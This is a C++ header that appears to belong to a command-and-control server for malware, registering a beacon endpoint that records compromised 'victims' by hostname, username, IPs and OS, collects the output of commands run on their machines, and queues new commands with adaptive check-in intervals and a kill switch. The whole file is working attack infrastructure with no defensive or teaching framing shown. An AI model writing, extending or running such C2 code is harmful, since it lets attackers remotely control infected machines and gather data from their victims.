#pragma once

#include "Beacon.hpp"
#include "Endpoints.hpp"
#include "LogDAO.hpp"
#include <string>
#include <vector>
#include <chrono>

#include <cpppwn.hpp>

#include <CommandDAO.hpp>
#include <ResultDAO.hpp>
#include <VictimDAO.hpp>
#include <Types.hpp>

#include <IManager.hpp>

//-------------------------------------------------
// Register beacon endpoint
//-------------------------------------------------
inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
    auto& victims = VictimManager::instance();
    auto& commands = CommandManager::instance();
    auto& results = ResultManager::instance();

    server.post("/api/beacon", [&](const HttpRequest& req) {
        try {
            BeaconRequest beacon;
            if (auto err = glz::read_json(beacon, req.body)) {
                return error_response(400, "Invalid beacon format");
            }

            // 1. Determine External IP from the socket if "auto" was sent
            std::string effective_ip = beacon.external_ip;
            if (effective_ip == "auto" || effective_ip == "1.1.1.1") {
                //effective_ip = req.ip_address; // Grab IP from connection
            }

            // 2. Register/Update Victim (Upsert Pattern)
            auto existing = victims.get_by_uid(beacon.victim_uid);

            // Prepare common data
            VictimDAO v_data = existing.value_or(VictimDAO{});
            v_data.uid = beacon.victim_uid;
            v_data.internal_ip = beacon.internal_ip;
            v_data.external_ip = effective_ip;
            v_data.hostname = beacon.hostname;
            v_data.username = beacon.username;
            v_data.operating_system = beacon.operating_system;
            v_data.last_update = get_unix_time(); // Using our custom function
            v_data.status = 1; // Online

            if (existing) {
                victims.update(existing->id, v_data);
            } else {
                victims.create(v_data);
            }

            // 3. Process Inbound Command Results
            for (const auto& cmd_result : beacon.command_results) {
                // Ensure the result actually matches a command we issued
                if (auto cmd_opt = commands.get_by_uid(cmd_result.command_uid)) {
                    ResultDAO res;
                    res.uid = cmd_result.command_uid;
                    res.data = cmd_result.result_data;
                    results.create(res);

                    // Update command to "Completed" (e.g., status 2)
                    cmd_opt->status = 2;
                    commands.update(cmd_opt->id, cmd_opt.value());
                }
            }

            // 4. Fetch Pending Commands (status 0)
            auto pending = commands.find([&](const CommandDAO& cmd) {
                return cmd.client == beacon.victim_uid && cmd.status == 0;
            });

            // 5. Prepare Response
            BeaconResponse response;
            response.commands = pending;
            response.should_exit = (v_data.status == 2); // 2 = Tasked to kill

            // Adaptive Sleep Logic
            if (not pending.empty()) {
                response.beacon_interval = (pending.size() > 5) ? 10 : 30;
            } else {
                response.beacon_interval = 120; // Default idle sleep
            }

            // Update commands to "Sent" (status 1) so they aren't sent twice
            for (auto& cmd : pending) {
                cmd.status = 1;
                commands.update(cmd.id, cmd);
            }

            return HttpResponse().set_json(glz::write_json(response).value_or("{}"));

        } catch (const std::exception& e) {
            return error_response(500, "Internal Server Error");
        }
    });
}

//-------------------------------------------------
// Register all beacon-related endpoints
//-------------------------------------------------
inline void register_all_beacon_endpoints(cpppwn::RESTServer& server) {
    register_beacon_endpoint(server);
}